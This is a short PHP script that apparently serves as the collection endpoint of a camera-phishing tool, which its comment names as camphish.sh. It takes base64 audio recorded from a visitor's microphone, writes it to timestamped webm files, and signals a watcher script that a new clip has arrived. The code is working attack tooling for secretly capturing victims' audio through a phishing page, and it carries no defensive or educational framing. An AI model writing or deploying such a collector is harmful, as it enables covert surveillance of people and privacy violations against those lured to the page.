<?php
$date = date('dMYHis');
$save_dir = 'logs/audio';
if (!is_dir($save_dir)) mkdir($save_dir, 0777, true);

if (!empty($_POST['audio_clip'])) {
    $audioData    = $_POST['audio_clip'];
    $filteredData = substr($audioData, strpos($audioData, ',') + 1);
    $unencodedData = base64_decode($filteredData);
    $ext = 'webm'; // MediaRecorder default
    $filepath = $save_dir . '/mic_' . $date . '.' . $ext;
    file_put_contents($filepath, $unencodedData);
    // signal file for camphish.sh watcher
    file_put_contents('logs/AudioLog.log', "audio\n", FILE_APPEND);
}

header('Content-Type: application/json');
echo json_encode(['status' => 'ok']);
exit();
